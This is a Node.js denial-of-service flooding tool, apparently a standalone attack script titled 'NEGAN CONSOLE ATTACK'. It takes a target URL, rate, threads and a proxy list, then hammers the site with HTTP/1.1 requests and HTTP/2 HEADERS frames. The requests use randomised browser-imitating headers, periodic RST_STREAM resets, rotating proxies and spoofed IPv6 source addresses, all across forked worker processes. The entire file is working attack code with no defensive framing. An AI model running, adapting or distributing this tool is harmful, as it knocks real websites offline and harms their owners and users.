const fs = require('fs');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const os = require('os');
const cluster = require('cluster');
const crypto = require('crypto');

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 8) {
    console.error("Usage: node ok.js <URL> <TIME> <THREADS> <RATELIMIT> <PORT> <PROXY_FILE>");
    process.exit(1);
}

const NORMAL = process.env.NORMAL || "0";
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const port = parseInt(process.argv[6], 10);
let mqfi9qjkf3i;

if (NORMAL !== "1") {
    mqfi9qjkf3i = fs.readFileSync(process.argv[7], 'utf8').replace(/\r/g, '').split('\n');
}

const url = new URL(target);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    return payload.length > 0 ? Buffer.concat([frame, payload]) : frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset !== length) return null;
    }

    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function getLocalIPv6() {
    const interfaces = os.networkInterfaces();
    for (const ifaceName of Object.keys(interfaces)) {
        const iface = interfaces[ifaceName];
        const ipv6 = iface.find(details => details.family === 'IPv6' && !details.internal);
        if (ipv6) return ipv6.address.split('%')[0].replace('::2', '').replace('::1', '');
    }
    return null;
}

const ipv6 = getLocalIPv6();
let a = 1, b = 1, c = 1, d = 1, g = 0;

function rnd_ip_block() {
    d += 1;
    if (d >= 9999) { d = 1; c += 1; }
    if (c >= 9999) { c = 1; d = 1; b += 1; }
    if (b >= 9999) { b = 1; c = 1; d = 1; a += 1; }
    if (a >= 9999) { a = 1; b = 1; c = 1; d = 1; }
    return `${ipv6}:${a}:${b}:${c}:${d}`;
}

let custom_table = 65536, custom_update = 15663105, statusesQ = [], statuses = {}, getgoaway = 0, ssssf = 0;

setInterval(() => g = 0, 10000);
setInterval(() => knownpath = a + b + c + d, 1000);

function h1_handler(method = "GET") {
    const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
    let request = `${method} ${url.pathname}CURRENT=${ssssf} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: ru,en-US;q=0.9,en;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: ${randomString}\r\n`;
    ssssf += 1;

    if (Math.random() < 0.5) {
        request += `Sec-Fetch-Mode: ${randomString}\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ${randomString}\r\nReferer: https://${randomString}${url.hostname}/${randomString}\r\nOrigin: https://${randomString}${url.hostname}\r\n\r\n`;
        if (method === "POST") request += randomString;
    } else {
        request += 'Sec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nReferer: https://${randomString}${url.hostname}/${randomString}\r\nOrigin: https://${randomString}${url.hostname}\r\n\r\n';
        if (method === "POST") request += randomString;
    }

    return Buffer.from(request, 'binary');
}

const http1Payload = Buffer.concat(new Array(1).fill(h1_handler("GET")));
const http1PayloadPost = Buffer.concat(new Array(1).fill(h1_handler("POST")));

function go() {
    let SocketTLS;
    const ip_address = rnd_ip_block();
    const [proxyHost, proxyPort] = mqfi9qjkf3i[~~(Math.random() * mqfi9qjkf3i.length)].split(':');

    if (NORMAL === "1") {
        const netSocket = net.connect({ port, host: url.host, localAddress: ip_address }, () => {
            SocketTLS = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                session: crypto.randomBytes(64),
                secure: true,
                rejectUnauthorized: false
            }, () => {
                if (!SocketTLS.alpnProtocol || SocketTLS.alpnProtocol === 'http/1.1') {
                    SocketTLS.on('data', (eventData) => {
                        const responseStr = eventData.toString('utf8');
                        const statusMatch = responseStr.match(/HTTP\/1\.1 (\d{3})/);
                        if (statusMatch) statuses[statusMatch[1]] = (statuses[statusMatch[1]] || 0) + 1;
                    });

                    function main() {
                        Math.random() < 0.5 ? SocketTLS.write(http1Payload, (err) => {
                            if (err) SocketTLS.end(() => SocketTLS.destroy());
                            else setTimeout(main, 1000 / ratelimit);
                        }) : SocketTLS.write(http1PayloadPost, (err) => {
                            if (err) SocketTLS.end(() => SocketTLS.destroy());
                            else setTimeout(main, 1000 / ratelimit);
                        });
                    }
                    main();

                    SocketTLS.on('error', () => SocketTLS.end(() => SocketTLS.destroy()));
                } else {
                    let streamId = 1, streamIdReset = 1, data = Buffer.alloc(0), hpack = new HPACK();
                    hpack.setTableSize(2048);

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(custom_update, 0);

                    if (getgoaway >= 1000 && g === 0) {
                        custom_table += 1;
                        g = 1;
                    }

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([[1, 65535], [2, 0], [4, 6291456], [6, 262144]])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    SocketTLS.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData]);
                        while (data.length >= 9) {
                            const frame = decodeFrame(data);
                            if (!frame) break;

                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) SocketTLS.write(encodeFrame(0, 4, "", 1));
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                                statuses[status] = (statuses[status] || 0) + 1;
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                if (frame.type === 7) {
                                    SocketTLS.end();
                                    statuses["GOAWAY"] = (statuses["GOAWAY"] || 0) + 1;
                                    getgoaway += 1;
                                }
                                SocketTLS.end(() => SocketTLS.destroy());
                            }
                        }
                    });

                    SocketTLS.write(Buffer.concat(frames));
                    let currenthead = 0;

                    function main() {
                        if (SocketTLS.destroyed) return;

                        for (let i = 0; i < ratelimit; i++) {
                            const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
                            const headers = Object.entries({
                                ":method": Math.random() < 0.5 ? "GET" : "POST",
                                ":authority": url.hostname,
                                ":scheme": "https",
                                ":path": url.pathname
                            }).concat(Object.entries({
                                "sec-ch-ua": `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`,
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": `"Windows"`,
                                "upgrade-insecure-requests": "1",
                                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                "sec-fetch-site": "none",
                                ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                                ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                                ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                                "accept-encoding": "gzip, deflate, br, zstd",
                                "accept-language": "ru,en-US;q=0.9,en;q=0.8",
                                ...(Math.random() < 0.5 && { "cookie": `${randomString}=${randomString}` }),
                                ...(Math.random() < 0.5 && { "referer": `https://${randomString}.com/${randomString}` })
                            }).filter(a => a[1] != null));

                            currenthead += 1;
                            if (currenthead === 12) currenthead = 0;

                            const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(headers)]);
                            SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                            if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                SocketTLS.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                            }
                            streamIdReset += 2;
                            streamId += 2;
                        }
                        setTimeout(main, 1000 / ratelimit);
                    }
                    main();
                }
            }).on('error', () => SocketTLS.destroy());
        }).once('error', () => {}).once('close', () => SocketTLS && SocketTLS.end(() => SocketTLS.destroy()));
    } else {
        const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
            netSocket.once('data', () => {
                SocketTLS = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                    session: crypto.randomBytes(64),
                    secure: true,
                    rejectUnauthorized: false
                }, () => {
                    if (!SocketTLS.alpnProtocol || SocketTLS.alpnProtocol === 'http/1.1') {
                        SocketTLS.on('data', (eventData) => {
                            const responseStr = eventData.toString('utf8');
                            const statusMatch = responseStr.match(/HTTP\/1\.1 (\d{3})/);
                            if (statusMatch) statuses[statusMatch[1]] = (statuses[statusMatch[1]] || 0) + 1;
                        });

                        function main() {
                            Math.random() < 0.5 ? SocketTLS.write(http1Payload, (err) => {
                                if (err) SocketTLS.end(() => SocketTLS.destroy());
                                else setTimeout(main, 1000 / ratelimit);
                            }) : SocketTLS.write(http1PayloadPost, (err) => {
                                if (err) SocketTLS.end(() => SocketTLS.destroy());
                                else setTimeout(main, 1000 / ratelimit);
                            });
                        }
                        main();

                        SocketTLS.on('error', () => SocketTLS.end(() => SocketTLS.destroy()));
                    } else {
                        let streamId = 1, streamIdReset = 1, data = Buffer.alloc(0), hpack = new HPACK();
                        hpack.setTableSize(2048);

                        const updateWindow = Buffer.alloc(4);
                        updateWindow.writeUInt32BE(custom_update, 0);

                        if (getgoaway >= 1000 && g === 0) {
                            custom_table += 1;
                            g = 1;
                        }

                        const frames = [
                            Buffer.from(PREFACE, 'binary'),
                            encodeFrame(0, 4, encodeSettings([[1, 65535], [2, 0], [4, 6291456], [6, 262144]])),
                            encodeFrame(0, 8, updateWindow)
                        ];

                        SocketTLS.on('data', (eventData) => {
                            data = Buffer.concat([data, eventData]);
                            while (data.length >= 9) {
                                const frame = decodeFrame(data);
                                if (!frame) break;

                                data = data.subarray(frame.length + 9);
                                if (frame.type === 4 && frame.flags === 0) SocketTLS.write(encodeFrame(0, 4, "", 1));
                                if (frame.type === 1) {
                                    const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                                    statuses[status] = (statuses[status] || 0) + 1;
                                }
                                if (frame.type === 7 || frame.type === 5) {
                                    if (frame.type === 7) {
                                        SocketTLS.end();
                                        statuses["GOAWAY"] = (statuses["GOAWAY"] || 0) + 1;
                                        getgoaway += 1;
                                    }
                                    SocketTLS.end(() => SocketTLS.destroy());
                                }
                            }
                        });

                        SocketTLS.write(Buffer.concat(frames));
                        let currenthead = 0;

                        function main() {
                            if (SocketTLS.destroyed) return;

                            for (let i = 0; i < ratelimit; i++) {
                                const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
                                const headers = Object.entries({
                                    ":method": Math.random() < 0.5 ? "GET" : "POST",
                                    ":authority": url.hostname,
                                    ":scheme": "https",
                                    ":path": url.pathname
                                }).concat(Object.entries({
                                    "sec-ch-ua": `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`,
                                    "sec-ch-ua-mobile": "?0",
                                    "sec-ch-ua-platform": `"Windows"`,
                                    "upgrade-insecure-requests": "1",
                                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                    "sec-fetch-site": "none",
                                    ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                                    ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                                    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                                    "accept-encoding": "gzip, deflate, br, zstd",
                                    "accept-language": "ru,en-US;q=0.9,en;q=0.8",
                                    ...(Math.random() < 0.5 && { "cookie": `${randomString}=${randomString}` }),
                                    ...(Math.random() < 0.5 && { "referer": `https://${randomString}.com/${randomString}` })
                                }).filter(a => a[1] != null));

                                currenthead += 1;
                                if (currenthead === 12) currenthead = 0;

                                const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(headers)]);
                                SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                    SocketTLS.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                                }
                                streamIdReset += 2;
                                streamId += 2;
                            }
                            setTimeout(main, 1000 / ratelimit);
                        }
                        main();
                    }
                }).on('error', () => SocketTLS.destroy());
            });
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        }).once('error', () => {}).once('close', () => SocketTLS && SocketTLS.end(() => { SocketTLS.destroy(); go(); }));
    }
}

if (cluster.isMaster) {
    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`NEGAN CONSOLE ATTACK`);

    cluster.on('exit', (worker) => cluster.fork({ core: worker.id % os.cpus().length }));
    cluster.on('message', (worker, message) => workers[worker.id] = [worker, message]);

    setInterval(() => {
        let statuses = {};
        for (let w in workers) {
            if (workers[w][0].state === 'online') {
                for (let st of workers[w][1]) {
                    for (let code in st) statuses[code] = (statuses[code] || 0) + st[code];
                }
            }
        }
        console.clear();
        console.log(statuses);
    }, 1000);

    setTimeout(() => process.exit(1), time * 1000);
} else {
    let i = setInterval(go);
    setInterval(() => {
        if (statusesQ.length >= 4) statusesQ.shift();
        statusesQ.push(statuses);
        statuses = {};
        process.send(statusesQ);
    }, 950);

    setTimeout(() => process.exit(1), time * 1000);
}
